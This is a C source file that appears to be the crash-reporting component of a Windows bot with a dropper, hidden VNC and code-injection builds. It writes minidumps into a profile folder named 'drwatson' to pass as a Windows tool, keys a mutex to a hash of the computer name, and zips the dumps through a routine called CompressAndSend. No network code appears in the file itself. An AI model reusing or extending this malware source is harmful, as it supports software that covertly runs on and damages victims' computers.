#include "includes.h"
#include <intrin.h>
#include "crashrpt.h"
#include "dropper.h"
#include "bot\system.h"

TCHAR szProfilePath[MAX_PATH],
      szReportsPath[MAX_PATH],
      szSSFormat[]=_T("%s\\%s");

extern TCHAR szKillEventNameFormat[];
HANDLE hDebugMutex;

#ifndef _INJEXE
bool IsDirectoryEmpty(TCHAR *lpPath, TCHAR *lpMask)
{
    bool bRet=true;
    HANDLE hFind;
    WIN32_FIND_DATA fndata;
    TCHAR szBuff[MAX_PATH];
    wsprintf(szBuff,szSSFormat,lpPath,lpMask);
    if ((hFind=FindFirstFile(szBuff,&fndata)) != INVALID_HANDLE_VALUE)
    {
        wsprintf(szBuff,szSSFormat,lpPath,fndata.cFileName);
        HANDLE hFile;
        if ((hFile=CreateFile(szBuff,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL)) != INVALID_HANDLE_VALUE)
        {
            bRet=false;
            SysCloseHandle(hFile);
        }
        FindClose(hFind);
    }
    return bRet;
}

bool CompressAndSend()
{
    bool bRet=false;
    WCHAR szMask[]=L"*.dmp",*lpMask=szMask;
    g_enter(hDebugMutex)
        if (!IsDirectoryEmpty(szReportsPath,szMask))
        {
            char szArch[MAX_PATH];
            SYSTEMTIME st;
            GetLocalTime(&st);
            wsprintfA(szArch,"%S\\%04d.%02d.%02d %02d-%02d-%02d%03d.zip",szReportsPath,st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond,st.wMilliseconds);

            HZIP hZip=CreateArchiveA(szArch,NULL,NULL,9);
            ArchiveFolderW(hZip,szReportsPath,&lpMask,1,CFF_RECURSE+CFF_DELETE);
            ArchClose(hZip);

            bRet=true;
        }
    g_leave(hDebugMutex)
    return bRet;
}

void WINAPI CrashRepWatchThread(LPVOID tmp)
{
    CompressAndSend();
    while (WaitForSingleObject(hKillEvent,0) == WAIT_TIMEOUT)
    {
        HANDLE hChangeHandle=FindFirstChangeNotification(szReportsPath,FALSE,FILE_NOTIFY_CHANGE_LAST_WRITE);
        while (WaitForSingleObject(hKillEvent,0) == WAIT_TIMEOUT)
        {
            if (WaitForSingleObject(hChangeHandle,1) != WAIT_TIMEOUT)
            {
                if (CompressAndSend())
                    break;
                if (!FindNextChangeNotification(hChangeHandle))
                    break;
            }
        }
        FindCloseChangeNotification(hChangeHandle);
    }
    return;
}
#endif

BOOL CALLBACK MiniDumpCallback(PVOID pParam,PMINIDUMP_CALLBACK_INPUT pInput,PMINIDUMP_CALLBACK_OUTPUT pOutput)
{
    BOOL bRet=FALSE;
    if ((pInput) && (pOutput))
    {
        switch (pInput->CallbackType)
        {
            case ModuleCallback:
            {
                if (!(pOutput->ModuleWriteFlags & ModuleReferencedByMemory))
                    pOutput->ModuleWriteFlags&=~ModuleWriteModule;
            }
            case ThreadExCallback:
            case ThreadCallback:
            case IncludeThreadCallback:
            case IncludeModuleCallback:
            {
                bRet=TRUE;
                break;
            }
            case CancelCallback:
            case MemoryCallback:
                break;
        }
    }
    return bRet;
}

LONG WINAPI CrashRptExeptionFilter(EXCEPTION_POINTERS *ExceptionInfo)
{
#ifndef _INJEXE
    VNCCleanup(true);
#else
    LONG dwRet=EXCEPTION_CONTINUE_SEARCH;
#endif

    SIZE_T lpImageBase=(SIZE_T)ldr_GetImageBase((byte*)_ReturnAddress());

	PEXCEPTION_RECORD lpException=ExceptionInfo->ExceptionRecord;
	PCONTEXT lpContext=ExceptionInfo->ContextRecord;

#ifdef _INJEXE
#ifdef _AMD64_
    SIZE_T lpIP=(SIZE_T)lpContext->Rip;
#else
    SIZE_T lpIP=(SIZE_T)lpContext->Eip;
#endif
    DWORD dwImageSize=ldr_GetImageSize();
    if (((lpIP >= lpImageBase) && (lpIP <= lpImageBase+dwImageSize)) || (((SIZE_T)lpException->ExceptionAddress >= lpImageBase) && ((SIZE_T)lpException->ExceptionAddress <= lpImageBase+dwImageSize)))
        dwRet=EXCEPTION_EXECUTE_HANDLER;
    else
    {
#ifdef _AMD64_
        SIZE_T *lpStack=(SIZE_T *)lpContext->Rsp;
#else
        SIZE_T *lpStack=(SIZE_T *)lpContext->Esp;
#endif
        SIZE_T *lpStackTop=(SIZE_T*)((PNT_TIB)NtCurrentTeb())->StackBase;

        if (lpStackTop > lpStack+3072)
            lpStackTop=lpStack+3072;

        while (lpStack <= lpStackTop)
        {
            lpIP=*lpStack;
            if ((lpIP >= lpImageBase) && (lpIP <= lpImageBase+dwImageSize))
            {
                dwRet=EXCEPTION_EXECUTE_HANDLER;
                break;
            }
            lpStack++;
        }
    }
#endif

    TCHAR szFileName[MAX_PATH],*lpFileName;
    DWORD dwLen=GetModuleFileName(NULL,szFileName,MAX_PATH),
          i=dwLen;
    for (; i; i--)
    {
        if ((szFileName[i-1] == '\\') || (szFileName[i-1] == ':'))
            break;
    }
    lpFileName=&szFileName[i];

    SYSTEMTIME st;
    GetLocalTime(&st);

    WCHAR fname[MAX_PATH],szMiniDumpFile[512];
    wsprintfW(fname,L"%s %x-%x %04d.%02d.%02d %02d-%02d-%02d%03d.dmp",lpFileName,GetCurrentProcessId(),GetCurrentThreadId(),st.wYear,st.wMonth,st.wDay,st.wHour,st.wMinute,st.wSecond,st.wMilliseconds);
    PathCombineW(szMiniDumpFile,szReportsPath,fname);

    g_enter(hDebugMutex)
        HANDLE hFile=CreateFileW(szMiniDumpFile,GENERIC_WRITE,NULL,0,CREATE_ALWAYS,0,0);
        if (hFile != INVALID_HANDLE_VALUE)
        {
            MINIDUMP_EXCEPTION_INFORMATION info;
            info.ThreadId=GetCurrentThreadId();
            info.ExceptionPointers=ExceptionInfo;
            info.ClientPointers=FALSE;

            MINIDUMP_CALLBACK_INFORMATION mci;
            mci.CallbackRoutine=(MINIDUMP_CALLBACK_ROUTINE)MiniDumpCallback;
            mci.CallbackParam=0;
            MINIDUMP_TYPE mdt=(MINIDUMP_TYPE)(MiniDumpWithIndirectlyReferencedMemory+MiniDumpScanMemory);
            MiniDumpWriteDump(GetCurrentProcess(),GetCurrentProcessId(),hFile,mdt,&info,0,&mci);
            SysCloseHandle(hFile);
        }
    g_leave(hDebugMutex)

#ifndef _INJEXE
    CompressAndSend();
    return EXCEPTION_EXECUTE_HANDLER;
#else
    return dwRet;
#endif
}

bool bCrashRptInit=false;
#ifndef _DEBUG
LPTOP_LEVEL_EXCEPTION_FILTER lpLastFilter;
#endif

void InitCrashRpt()
{
    if (bCrashRptInit)
        return;
    bCrashRptInit=true;

    char szCompName[100];
    DWORD dwSize=sizeof(szCompName);
    GetComputerNameA(szCompName,&dwSize);

    TCHAR szDebugMutex[200];
    DWORD dwHash=chksum_crc32((byte*)szCompName,lstrlenA(szCompName));
    wsprintf(szDebugMutex,szKillEventNameFormat,dwHash*3);

#ifdef _INJEXE
    GetUserDir(szProfilePath);
    hDebugMutex=OpenMutex(MUTEX_ALL_ACCESS,false,szDebugMutex);
#else
    hDebugMutex=CreateMutex(NULL,false,szDebugMutex);
#endif

#ifndef _DEBUG
    wsprintf(szReportsPath,_T("%s\\drwatson"),szProfilePath);
    lpLastFilter=SetUnhandledExceptionFilter(CrashRptExeptionFilter);
#ifndef _INJEXE
    CreateDirectoryTree(szReportsPath);

    CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)CrashRepWatchThread,NULL,0,NULL);
#endif
#endif
    return;
}

